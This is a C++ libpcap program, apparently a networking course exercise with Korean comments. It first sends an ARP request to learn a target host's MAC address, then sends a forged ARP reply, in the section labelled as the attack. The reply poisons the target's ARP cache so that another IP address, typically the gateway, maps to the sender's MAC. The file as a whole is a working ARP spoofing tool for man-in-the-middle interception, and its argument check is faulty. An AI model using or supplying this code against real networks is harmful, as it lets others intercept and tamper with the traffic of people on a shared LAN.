#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>

//For string get_mac_address(void)
#include <sys/types.h>
#include <sys/socket.h>
#include <string>
/////////////////////////////////////////

#include <sys/ioctl.h> //ioctl function
#include <net/if.h> //struct ifreq

#include <unistd.h>//For close function, //in c++ -> write(), close()

using namespace std; //For string get_mac_address(void)

void getMyIpAddr(char* ip_addr, char* netInterface)
{
   struct ifreq ifr;
   int s;

   s = socket(AF_INET, SOCK_DGRAM, 0);
   strncpy(ifr.ifr_name, netInterface, IFNAMSIZ);

   if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
      printf("Error");
   } else {
      inet_ntop(AF_INET, 
            ifr.ifr_addr.sa_data+2,
         ip_addr,
            sizeof(struct sockaddr));
   }
}

string get_mac_address(void) { //출처: https://muabow.tistory.com/287 [이름 같은게 중요 한가요:티스토리
    int socket_fd;
    int count_if;

    struct ifreq  *t_if_req;
    struct ifconf  t_if_conf;

    char arr_mac_addr[18] = {0x00, };

    memset(&t_if_conf, 0, sizeof(t_if_conf));

    t_if_conf.ifc_ifcu.ifcu_req = NULL;
    t_if_conf.ifc_len = 0;

    if( (socket_fd = socket(PF_INET, SOCK_DGRAM, 0)) < 0 ) {
        return "";
    }

    if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) {
        return "";
    }

    if( (t_if_req = (ifreq *)malloc(t_if_conf.ifc_len)) == NULL ) {
        close(socket_fd);
        free(t_if_req);
        return "";

    } else {
        t_if_conf.ifc_ifcu.ifcu_req = t_if_req;
        if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) {
            close(socket_fd);
            free(t_if_req);
            return "";
        }

        count_if = t_if_conf.ifc_len / sizeof(struct ifreq);
        for( int idx = 0; idx < count_if; idx++ ) {
            struct ifreq *req = &t_if_req[idx];

            if( !strcmp(req->ifr_name, "lo") ) {
                continue;
            }

            if( ioctl(socket_fd, SIOCGIFHWADDR, req) < 0 ) {
                break;
            }

            sprintf(arr_mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x",
                    (unsigned char)req->ifr_hwaddr.sa_data[0],
                    (unsigned char)req->ifr_hwaddr.sa_data[1],
                    (unsigned char)req->ifr_hwaddr.sa_data[2],
                    (unsigned char)req->ifr_hwaddr.sa_data[3],
                    (unsigned char)req->ifr_hwaddr.sa_data[4],
                    (unsigned char)req->ifr_hwaddr.sa_data[5]);
            break;
        }
    }

    close(socket_fd);
    free(t_if_req);

    return arr_mac_addr;
}


#pragma pack(push, 1)
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
   printf("syntax: send-arp-test <interface>\n");
   printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
   if (argc == 0) {
      usage();
      return -1;
   }
    
    char myIP[20] = {0,};

   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }
    
   EthArpPacket packet;
    
    getMyIpAddr(myIP, dev);
    printf("MY IP: %s\n",myIP);//내 아이피 확인
   printf("dev: %s\n",dev); //ens~~~
    //printf("d= %s\n",argv[2]);
    //printf("d= %s\n",argv[3]);
    ///////////////////////////////////정보얻어오기////////////////
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //destination
   packet.eth_.smac_ = Mac(get_mac_address()); //  source mac
   packet.eth_.type_ = htons(EthHdr::Arp);

   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;
   packet.arp_.op_ = htons(ArpHdr::Request);
   packet.arp_.smac_ = Mac(get_mac_address()); //sendermac
   packet.arp_.sip_ = htonl(Ip(myIP));
   packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
   packet.arp_.tip_ = htonl(Ip(argv[2]));
   /*수정한 부분 패킷 전송부분 추가*/
   int res_send = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
   if (res_send != 0) {
      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_send, pcap_geterr(handle));
   }


    //// sender mac 받아오기////
    Mac attack;
    struct pcap_pkthdr* header;
    const u_char *pkt_data;
    while (true) {
        int res = pcap_next_ex(handle, &header, &pkt_data);// 패킷 계속 받기 , int pcap_next_ex(pcap_t *p, struct pcap_pkthdr **pkt_header,const u_char **pkt_data);
        
        EthArpPacket* NewPacket;
        NewPacket = (EthArpPacket*)pkt_data;
        if(ntohs(NewPacket->eth_.type_) == 0x0806){
            uint32_t sIp = htonl((uint32_t)NewPacket->arp_.sip_);
            //printf("%d\n",sIp);
           /*수정한 부분*/
            char sip[40] = {0,};
            sprintf(sip, 
            "%d.%d.%d.%d", 
            (sIp >> 24) &0xff, (sIp >> 16) & 0xff, (sIp >>8) & 0xff, sIp & 0xff);
            printf("받아온 패킷 아이피: %s\n",sip);
            
            if(strncmp(sip, argv[2], strlen(argv[2])) == 0){ //공격대상의 아이피와 같은 응답이 오면 같이오는 공격대상의 맥주소 저장      
                attack = NewPacket->arp_.smac_;
                break;
            }
        }
    }
    //////////////공격//////////////////////////////
   printf("Attack\n");
   EthArpPacket packet1;
   packet1.eth_.type_ = htons(EthHdr::Arp);
   packet1.eth_.smac_ = Mac(get_mac_address());
   packet1.eth_.dmac_ = attack;
   packet1.arp_.tmac_ = attack;
    
   packet1.arp_.op_ = htons(ArpHdr::Reply);
   packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet1.arp_.pro_ = htons(EthHdr::Ip4);
   packet1.arp_.hln_ = Mac::SIZE;
   packet1.arp_.pln_ = Ip::SIZE;
   packet1.arp_.sip_ = htonl(Ip(argv[3]));/*수정한 부분 인자 바뀜*/
   packet1.arp_.smac_ = Mac(get_mac_address());
   packet1.arp_.tip_ = htonl(Ip(argv[2]));/*수정한 부분*/
   
  /*수정한 부분 &packet1 공격패킷을 전송하도록함*/
   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
   if (res != 0) {
      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
   }

   pcap_close(handle);
}
